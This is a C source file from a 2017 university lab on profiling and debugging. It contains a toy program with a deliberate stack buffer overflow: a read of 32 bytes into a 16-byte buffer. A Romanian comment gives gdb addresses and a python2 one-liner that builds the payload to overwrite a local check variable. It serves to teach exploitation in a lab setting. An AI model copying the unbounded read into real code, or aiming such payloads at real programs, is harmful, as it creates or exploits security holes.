/**
 * SO, 2017 - Lab #07, Profiling & Debugging
 * Task #7, Linux
 *
 * Buffer overflow exploit
 */

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

#define MAX_NAME_LEN		16

void access_granted(void)
{
	puts("Good job, you hacked me!");
}

void access_denied(void)
{
	puts("Try again :(");
}

void read_name(void)
{
	int access = 0xDEADF00D;
	char name[MAX_NAME_LEN];

	/*
	 * (gdb) p/x &access
	 * $1 = 0x7fffffffdc6c
	 * (gdb) p/x &name
	 * $3 = 0x7fffffffdc50
	 *
	 * deci diferenta dintre ele e 28. asa ca am pus 28 de A-uri si dupa ele
	 * am pus 0x00BADA55 in little endian:
	 *
	 * python2 -c 'print "A"*28 + "\x55\xda\xba\x00"' > payload
	 */
	if (read(STDIN_FILENO, name, 32) < 0)
		exit(EXIT_FAILURE);

	if (access == 0x00BADA55)
		access_granted();
	else
		access_denied();
}

int main(void)
{

	puts("What's your name?");
	read_name();

	return 0;
}
